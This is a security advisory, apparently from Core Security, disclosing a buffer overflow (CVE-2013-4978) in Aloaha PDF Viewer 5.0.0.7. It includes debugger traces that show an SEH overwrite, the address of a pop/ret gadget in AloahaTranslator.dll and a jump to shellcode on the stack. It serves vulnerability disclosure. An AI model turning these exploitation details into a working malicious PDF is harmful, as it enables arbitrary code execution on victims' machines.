Aloaha PDF Suite Buffer Overflow Vulnerability


1. *Advisory Information*

Title: Aloaha PDF Suite Buffer Overflow Vulnerability
Advisory ID: CORE-2013-0805
Advisory URL:
http://www.coresecurity.com/advisories/aloaha-pdf-suite-buffer-overflow-vulnerability
Date published: 2013-08-28
Date of last update: 2013-08-28
Vendors contacted: Aloaha Software
Release mode: User release


2. *Vulnerability Information*

Class: Buffer overflow [CWE-119]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-4978


3. *Vulnerability Description*

Aloaha PDF Suite [1], [2] is prone to a security vulnerability when
processing PDF files. This vulnerability could be exploited by a remote
attacker to execute arbitrary code on the target machine by enticing
Aloaha users to open a specially crafted PDF file.


4. *Vulnerable Packages*

   . AloahaPDFViewer v5.0.0.7.
   . Older versions are probably affected too, but they were not checked.

5. *Vendor Information, Solutions and Workarounds*

There was no official answer from Aloaha after several attempts to
report this vulnerability (see [Sec. 8]). As mitigation action, given
that this is a client-side vulnerability, avoid to open untrusted PDF
files. Contact vendor for further information.


6. *Credits*

This vulnerability was discovered and researched by Marcos Accossatto
from CORE Exploit Writers Team.


7. *Technical Description / Proof of Concept Code*

Below is shown the result of opening the maliciously crafted PDF file [3]:


/-----
$+B6BB8  >|>  8B07              |MOV EAX,DWORD PTR DS:[EDI]
$+B6BBA  >|.  C740 14 1E000000  |MOV DWORD PTR DS:[EAX+14],1E    ;  <
Exception - Tries to write to 909090A4
$+B6BC1  >|.  8B5424 04         |MOV EDX,DWORD PTR SS:[ESP+4]
$+B6BC5  >|.  8950 18           |MOV DWORD PTR DS:[EAX+18],EDX
$+B6BC8  >|.  8BC7              |MOV EAX,EDI
$+B6BCA  >|.  8B10              |MOV EDX,DWORD PTR DS:[EAX]    
-----/

At that time, the registers 'EDX', 'EBX', 'EBP' and 'EDI' points to the
shellcode; the 'EAX' register contains the first 'DWORD' of our shellcode:

/-----
EAX 90909090
ECX 000007B4
EDX 0012DD44 ASCII "DDDDDDDDDDDDDD..."
EBX 051ACFF1 ASCII "DDDDDDDDDDDDDD..."

FCW 037F  Prec NEAR,64  Mask    1 1 1 1 1 1    

-----/

The stack's exception handler is overwritten with:

/-----
0012D9EC   FFFFF94D
0012D9F0   0000000A
  ....       ....
0012DB5C   0EDDE2F1
0012DB60   909006EB  Pointer to next SEH record
0012DB64   1106D8A0  SE handler    
-----/

In the address '1106D8A0' of 'AloahaTranslator.dll' we have:


/-----
1106D8A0   .  83C4 14   ADD ESP,14
1106D8A3   .  C3        RETN
-----/

and the stack:


/-----
$ ==>    > 7C9032A8  RETURN to ntdll.7C9032A8
$+4      > 0012D704
$+8      > 0012DB60
$+C      > 0012D720
$+10     > 0012D6D8
$+14     > 0012DB60  Pointer to next SEH record
-----/

So, the 'RETN' of '1106D8A3' will jump to '12DB60' (the stack) where our
shellcode is located:

/-----
0012DB60   EB 06             JMP SHORT 0012DB68
0012DB62   90                NOP
0012DB63   90                NOP
0012DB64   A0 D8061190       MOV AL,BYTE PTR DS:[901106D8]
0012DB69   90                NOP   
-----/

which means the normal execution flow can be altered in order to execute
arbitrary code.
